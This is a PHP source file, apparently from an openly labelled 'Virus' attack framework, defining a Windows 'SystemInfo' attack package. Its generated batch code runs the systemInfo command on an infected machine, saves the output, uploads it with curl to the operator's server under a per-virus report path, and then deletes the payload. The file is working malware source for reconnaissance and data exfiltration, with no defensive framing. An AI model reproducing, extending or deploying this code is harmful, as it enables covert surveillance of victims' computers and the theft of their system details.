<?php

namespace Kelvinho\Virus\Attack\Packages\Windows\OneTime\SystemInfo;

use Kelvinho\Virus\Attack\AttackBase;
use Kelvinho\Virus\Attack\BaseScript\Windows;

/**
 * Class SystemInfo. Collects system information. This basically run the "systemInfo" command and get back the results.
 *
 * @package Kelvinho\Virus\Attack\Packages\Windows\OneTime
 * @author Quang Ho <157239q@gmail.com>
 * @copyright Copyright (c) 2020 Quang Ho <https://github.com/157239n>
 * @license http://www.opensource.org/licenses/mit-license.html  MIT License
 */
class SystemInfo extends AttackBase {
    public string $systemInfo = "";

    public function getSystemInfo(): string {
        return $this->systemInfo;
    }

    public function setSystemInfo(string $systemInfo): SystemInfo {
        $this->systemInfo = $systemInfo;
        return $this;
    }

    public function generateBatchCode(): void {
        //@formatter:off ?>
        chCp 65001
        systemInfo > "%~pd0system"
        <?php echo Windows::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode()); //@formatter:on
        echo Windows::cleanUpPayload();
    }

    private function generateUploadCode() {
        ob_start(); ?>
        curl --form "systemFile=@%~pd0system;filename=system" --post301 --post302 --post303 -L <?php echo ALT_SECURE_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/report"; ?>
        <?php return ob_get_clean();
    }

    public function processExtras(string $resourceIdentifier): void {
    }

    protected function setState(string $json): void {
        $state = json_decode($json, true);
        $this->systemInfo = $state["systemInfo"];
    }

    protected function getState(): string {
        $state = [];
        $state["systemInfo"] = $this->systemInfo;
        return json_encode($state);
    }
}
